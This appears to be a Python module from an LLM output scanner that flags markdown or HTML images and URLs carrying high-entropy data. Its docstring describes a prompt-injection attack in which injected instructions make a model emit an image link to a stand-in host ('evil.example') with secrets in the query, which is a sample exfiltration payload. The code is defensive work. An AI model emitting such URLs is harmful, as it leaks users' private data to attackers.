"""Data-exfiltration-by-URL detection in model output.

A classic attack: injected instructions make the model emit a markdown image
or link whose URL carries your data, e.g. ![](https://evil.example/p?d=<secret>).
When a chat UI renders it, the browser sends the data without any click.
"""

from __future__ import annotations

import re
from urllib.parse import parse_qsl, urlsplit

from ..events import Severity
from . import Finding
from .secrets import shannon_entropy
from .toolcalls import EXFIL_HOSTS

MD_IMAGE = re.compile(r"!\[[^\]]*\]\(\s*<?(https?://[^\s)>]+)")
HTML_IMG = re.compile(r"(?i)<img[^>]+src\s*=\s*[\"']?(https?://[^\s\"'>]+)")
URL = re.compile(r"https?://[^\s<>\"')\]]+")


def _suspicious_payload(url: str) -> str | None:
    try:
        parts = urlsplit(url)
    except ValueError:
        return None
    candidates = [v for _, v in parse_qsl(parts.query, keep_blank_values=True)]
    candidates += [seg for seg in parts.path.split("/") if seg]
    candidates.append(parts.fragment)
    for v in candidates:
        if len(v) >= 48 and shannon_entropy(v) >= 4.0:
            return v
    if len(parts.query) > 300:
        return parts.query
    return None


def detect(text: str) -> list[Finding]:
    out: list[Finding] = []
    seen = set()
    for rx, kind in ((MD_IMAGE, "markdown image"), (HTML_IMG, "HTML image")):
        for m in rx.finditer(text):
            url = m.group(1)
            seen.add(url)
            payload = _suspicious_payload(url)
            host = urlsplit(url).hostname or ""
            if payload or EXFIL_HOSTS.search(url):
                out.append(Finding("exfil.image_url", Severity.HIGH,
                                   f"Model output contains a {kind} that carries data to {host}",
                                   url[:160], m.start()))
            elif "?" in url:
                out.append(Finding("exfil.image_with_query", Severity.LOW,
                                   f"Model output contains a {kind} with query parameters ({host})",
                                   url[:160], m.start()))
    for m in URL.finditer(text):
        url = m.group(0)
        if url in seen:
            continue
        if _suspicious_payload(url):
            out.append(Finding("exfil.data_in_url", Severity.MEDIUM,
                               f"URL with encoded payload ({urlsplit(url).hostname})", url[:160], m.start()))
    return out
